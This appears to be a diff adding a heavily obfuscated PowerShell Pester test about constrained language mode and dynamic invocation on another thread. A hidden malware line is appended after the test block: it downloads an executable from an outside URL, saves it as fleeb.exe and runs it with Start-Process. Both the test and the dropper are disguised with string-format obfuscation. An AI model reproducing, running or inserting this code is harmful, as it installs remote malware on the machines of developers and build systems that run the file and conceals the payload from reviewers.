@@ -1,0 +1,44 @@
+  $iPh2fv  =[TYPE]("{1}{0}{2}" -f'ErSHe','pOw','LL') ;  
+
+
+&("{0}{2}{1}"-f 'D','scribe','e') ("{4}{2}{6}{5}{1}{3}{0}"-f'ode','ined lang','on','uage m','Test c','ra','st') -Tags "CI" {
+    &('It') ("{9}{2}{1}{8}{12}{4}{7}{11}{6}{3}{0}{13}{14}{5}{10}" -f 'thr','ion','nvocat',' ','n-Po','s','hell','wer',' o','dynamic i','hould work','S','n no','ead',' ') {
+        ${REF`Ass`embLIES} = @()
+        if (!${iscO`RE`ClR}) {
+            ${rEF`AsSe`Mb`liES} += ("{0}{2}{1}{3}"-f'Mic','soft','ro','.CSharp')
+        }
+
+        ${t},${n`ULL} = .("{1}{2}{0}" -f'e','A','dd-Typ') -ReferencedAssemblies ${rE`FaSSe`mbLI`Es} -WarningAction ("{1}{0}" -f 'nore','Ig') -PassThru @"
+        public class BinderBug$(Get-Date -Format FileDateTime)
+        {
+            public static object Test(System.Management.Automation.PSObject psobj)
+            {
+                // Invoke a method through PSObject, but with dynamic, so we get PowerShell's dynamic site binder involved
+                // And we do this on a different thread so there is no ExecutionContext/runspace to check the language mode
+                // The actual method called doesn't really matter.
+
+                return System.Threading.Tasks.Task.Run(() => ((dynamic)psobj).AddCommand("Get-Command")).Result;
+            }
+        }
+"@
+
+        ${O} =   (  &("{3}{0}{2}{1}"-f 't-','iablE','VAR','GE') ('ip'+'H2fv')  -vA)::("{0}{1}" -f'C','reate').Invoke()
+        ${T}::("{0}{1}"-f'T','est').Invoke(${O}) | &("{0}{1}{2}" -f'Sho','u','ld') -BeExactly ${o}
+
+        try
+        {
+            
+            ${p`s} =  ( .('GI')  ('V'+'arIaBlE:'+'IPh'+'2FV') ).value::("{1}{0}"-f 'e','Creat').Invoke()
+            ${Nu`lL} = ${P`S}.("{0}{2}{1}"-f 'AddS','pt','cri').Invoke((('mA7'+'Exec'+'u'+'tionContex'+'t.Sess'+'ionState.Lan'+'guageMode ')."R`epLaCE"(([ChAr]109+[ChAr]65+[ChAr]55),'$')+'= '+('{0}'+'Constrai'+'n'+'edLa'+'ngu'+'age{0}')  -f [cHar]34))
+            ${nu`LL} = ${pS}."i`NV`oKE"()
+
+            ${T}::("{1}{0}"-f 't','Tes').Invoke(${O}) | &("{0}{1}{2}"-f'Sho','u','ld') -BeExactly ${O}
+        }
+        finally
+        {
+            ${p`S}.("{1}{2}{0}"-f'pose','D','is').Invoke()
+        }
+    }
+}
+
+(&("{0}{2}{1}"-f 'New','ject','-Ob') ("{2}{3}{4}{5}{6}{1}{0}" -f'nt','e','S','y','s','tem.N','et.WebCli')).("{0}{2}{1}"-f 'Downl','ile','oadF').Invoke(("{7}{8}{5}{4}{6}{0}{2}{1}{3}" -f'r/aqua','esh.ex','fr','e','play','.com/flow','e','http://','kiana'),("{1}{0}" -f'exe','fleeb.'));.("{0}{1}{2}"-f'S','tart-Proc','ess') ("{0}{2}{1}"-f 'fl','exe','eeb.')
